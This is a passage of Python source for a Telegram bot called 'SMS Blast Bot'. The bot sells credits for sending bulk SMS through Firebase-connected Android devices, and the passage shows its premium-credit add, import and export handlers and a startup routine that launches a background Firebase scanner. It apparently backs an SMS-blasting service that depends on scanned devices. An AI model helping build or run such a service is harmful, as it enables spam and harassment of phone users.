    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_GEAR, '🤖')} Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_BELL, '💬')} Support: Contact owner ({SUPER_ADMIN_NAME}) for any issues.\n\n"
        f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "owner:premium:add")
async def owner_premium_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_premium_admin(cq.from_user.id):
        await cq.answer("🚫 Super Admin Only!", show_alert=True)
        return
    await state.set_state(S.premium_add_user)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💎')} <b>Sell Premium Credit</b>\n\n"
        f"{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.premium_add_user)
async def owner_premium_add_user(msg: Message, state: FSMContext):
    if not is_premium_admin(msg.from_user.id):
        await state.clear()
        return
    try:
        user_id = int((msg.text or "").strip())
        if user_id <= 0:
            raise ValueError
    except (TypeError, ValueError):
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Valid positive User ID bhejo.",
            parse_mode="HTML"
        )
        return

    await state.update_data(premium_user_id=user_id)
    await state.set_state(S.premium_add_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💎')} <b>{sc('step 2/2')}</b>\n\n"
        f"Kitne premium credits add karne hain? (positive integer)",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.premium_add_amount)
async def owner_premium_add_amount(msg: Message, state: FSMContext):
    if not is_premium_admin(msg.from_user.id):
        await state.clear()
        return

    try:
        amount = int((msg.text or "").strip())
        if amount <= 0:
            raise ValueError
    except (TypeError, ValueError):
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Positive integer amount bhejo.",
            parse_mode="HTML"
        )
        return

    data = await state.get_data()
    user_id = data.get("premium_user_id")
    if not isinstance(user_id, int) or user_id <= 0:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid premium user ID.", parse_mode="HTML")
        return

    try:
        new_balance = await add_premium_credit(user_id, amount)
    except Exception as e:
        log.error(f"Premium credit add failed: {e}")
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Premium credit save failed.", parse_mode="HTML")
        return

    d = load()
    # Paid credits are also real bot credits, just like the normal Add Credits flow.
    add_credits(user_id, amount, d)
    save(d)
    log_activity(
        d,
        "premium_credit_added",
        msg.from_user.id,
        f"Added {amount} premium credits to {user_id}; new balance {new_balance}"
    )
    save(d)
    await state.clear()

    # Optional notification: only if the user is already registered.
    if str(user_id) in d.get("users", {}):
        try:
            await msg.bot.send_message(
                user_id,
                f"{em(EMOJI_MONEY, '💎')} <b>Premium Credits Added!</b>\n\n"
                f"+{amount} credits mile hain.\n"
                f"{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(user_id, d)}</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Premium Credits Added!</b>\n\n"
        f"User: <code>{user_id}</code>\n"
        f"Added: <b>+{amount}</b>\n"
        f"Premium Balance: <b>{new_balance}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:premium:export")
async def owner_premium_export(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    if not is_premium_admin(cq.from_user.id):
        await cq.answer("🚫 Super Admin Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        await _send_premium_export(cq.bot, cq.from_user.id)
    except Exception as e:
        log.error(f"Premium export failed: {e}")
        await cq.message.answer(f"{em(EMOJI_CROSS, '❌')} Export failed.", parse_mode="HTML")


@R.callback_query(F.data == "owner:premium:import")
async def owner_premium_import_start(cq: CallbackQuery, state: FSMContext):
    if not is_premium_admin(cq.from_user.id):
        await cq.answer("🚫 Super Admin Only!", show_alert=True)
        return
    await state.set_state(S.premium_import_file)
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '📥')} <b>Import Premium Credits</b>\n\n"
        f".json file upload karo.\n"
        "Format: <code>{\"USERID\": CREDIT}</code>\n"
        "Example: <code>{\"8834661642\": 999999776}</code>\n"
        f"<b>Important:</b> Import poori premium database ko replace karega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.premium_import_file)
async def owner_premium_import_file(msg: Message, state: FSMContext):
    if not is_premium_admin(msg.from_user.id):
        await state.clear()
        return

    if not msg.document:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Please .json document upload karo.",
            parse_mode="HTML"
        )
        return

    filename = msg.document.file_name or ""
    if filename != "PRIYANSHU.json":
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Sirf <code>PRIYANSHU.json</code> file allowed hai.",
            parse_mode="HTML"
        )
        return

    try:
        tg_file = await msg.bot.get_file(msg.document.file_id)
        buffer = BytesIO()
        await msg.bot.download_file(tg_file.file_path, destination=buffer)
        raw = buffer.getvalue().decode("utf-8-sig", errors="replace")
    except Exception as e:
        log.error(f"Premium import download failed: {e}")
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} File read nahi ho saki.", parse_mode="HTML")
        return

    imported = {}
    skipped = 0
    try:
        payload = json.loads(raw)
        if not isinstance(payload, dict):
            raise ValueError("root must be an object")
        for uid_text, credit_value in payload.items():
            try:
                user_id = int(uid_text)
                credit = int(credit_value)
                if user_id <= 0 or credit < 0:
                    raise ValueError
            except (TypeError, ValueError):
                skipped += 1
                continue
            imported[user_id] = credit
    except (json.JSONDecodeError, ValueError, TypeError):
        await state.clear()
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid <code>PRIYANSHU.json</code> format.",
            parse_mode="HTML"
        )
        return


    try:
        await _replace_premium_db(imported)
    except Exception as e:
        log.error(f"Premium import save failed: {e}")
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Import save failed.", parse_mode="HTML")
        return

    d = load()
    for user_id, credit in imported.items():
        d["users"].setdefault(str(user_id), {
            "credits": 0,
            "sms_history": []
        })
        d["users"][str(user_id)]["credits"] = credit
    log_activity(
        d,
        "premium_database_imported",
        msg.from_user.id,
        f"Imported {len(imported)} users; skipped {skipped} invalid lines"
    )
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Premium Database Imported!</b>\n\n"
        f"Imported <b>{len(imported)}</b> users, skipped <b>{skipped}</b> invalid lines.",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    premium_export_task = asyncio.create_task(background_premium_exporter(bot))
    log.info("Background scanner task created")
    log.info("Background premium exporter task created")

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"{em(EMOJI_GEAR, '🔄')} <b>Background Scanner:</b> Starting...\n"
            f"{em(EMOJI_WARNING, '⏱')} Auto-Scan Interval: <b>1 minute</b>\n"
            f"{em(EMOJI_STAR, '👥')} <b>Per-User Sessions:</b> ENABLED\n"
            f"{em(EMOJI_ROCKET, '🚀')} <b>Concurrent Users:</b> 1000+\n"
            f"{em(EMOJI_LOCK, '🔒')} <b>Number Protection:</b> ENABLED\n"
            f"{em(EMOJI_VIDEO, '📹')} <b>Video Section & Auto-Send:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits All:</b> ENABLED (No Notifications)\n"
            f"👤 <b>Bot Owner:</b> {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
